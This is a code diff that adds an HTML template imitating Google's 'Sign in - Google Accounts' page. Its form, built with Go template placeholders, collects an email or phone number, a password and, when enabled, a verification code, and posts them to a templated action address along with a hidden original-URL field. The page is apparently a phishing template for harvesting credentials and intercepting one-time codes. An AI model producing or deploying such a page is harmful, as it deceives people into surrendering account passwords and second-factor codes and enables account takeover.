@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sign in - Google Accounts</title>
+<style>
+  body { font-family: Roboto, "Segoe UI", Helvetica, Arial, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+  .card { border: 1px solid #dadce0; border-radius: 8px; width: 448px; padding: 48px 40px; }
+  .logo { color: #4285f4; font-size: 22px; font-weight: 600; letter-spacing: -.5px; }
+  h1 { font-size: 24px; font-weight: 400; margin: 12px 0 4px; }
+  .sub { color: #202124; font-size: 14px; margin-bottom: 28px; }
+  form { text-align: left; }
+  input { width: 100%; box-sizing: border-box; padding: 13px 12px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 12px; }
+  input:focus { outline: none; border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,.25); }
+  button { float: right; padding: 10px 24px; border: 0; border-radius: 4px; background: #1a73e8; color: #fff; font-size: 14px; font-weight: 600; cursor: pointer; }
+  .clear { clear: both; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">Google</div>
+  <h1>Sign in</h1>
+  <p class="sub">Use your Google Account</p>
+  <form method="post" action="{{.Action}}">
+    <input type="hidden" name="orig" value="{{.Orig}}">
+    <input type="text" name="username" placeholder="Email or phone" required autofocus>
+    <input type="password" name="password" placeholder="Enter your password" required>
+    {{if .ShowOTP}}<input type="text" name="otp" placeholder="Enter verification code" inputmode="numeric">{{end}}
+    <button type="submit">Next</button>
+    <div class="clear"></div>
+  </form>
+</div>
+</body>
+</html>
